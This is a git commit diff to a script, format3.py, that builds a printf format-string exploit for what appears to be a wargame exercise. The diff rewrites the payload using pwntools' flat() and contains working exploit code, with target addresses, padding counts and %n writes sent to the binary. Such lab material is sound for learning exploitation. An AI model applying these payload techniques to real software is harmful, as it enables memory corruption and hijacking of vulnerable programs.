2832f1ec4babf656ab04635dd3cf46b837d9797b
Clément Bœsch <u@pkh.me>
2020-01-04 15:46:22 +0100

    format3: simplify payload construction

--- format3.py
+++ format3.py
@@ -11,11 +11,12 @@ log.info('target_addr: %08x', target_addr)
 
 idx = 12  # payload index for printf
 nidx = lambda i: '%' + str(idx + i) + '$n'  # helper to focus on the addresses at the beginning of the payload
-payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2)  # first digit is far away (0x44), so we can fit the write addresses first
-payload += cyclic(0x38) + nidx(0)  # digit 0x44, offseted by the 3 target addresses in the payload
-payload += cyclic(0x11) + nidx(1)  # digit 0x55, adjusted from the 0x44 already printed char
-payload += cyclic(0xad) + nidx(2)  # d-digit 0x0102 adjusted to the 0x55 already printed. Note: splitting in 2 digits would bring too much problems
-payload += '\n'
+payload = flat([
+    target_addr, target_addr + 1, target_addr + 2,  # first digit is far away (0x44), so we can fit the write addresses first
+    cyclic(0x38), nidx(0),  # digit 0x44, offseted by the 3 target addresses in the payload
+    cyclic(0x11), nidx(1),  # digit 0x55, adjusted from the 0x44 already printed char
+    cyclic(0xad), nidx(2),  # d-digit 0x0102 adjusted to the 0x55 already printed. Note: splitting in 2 digits would bring too much problems
+])
 
 with s.system(args.BIN) as p:
     p.sendline(payload)
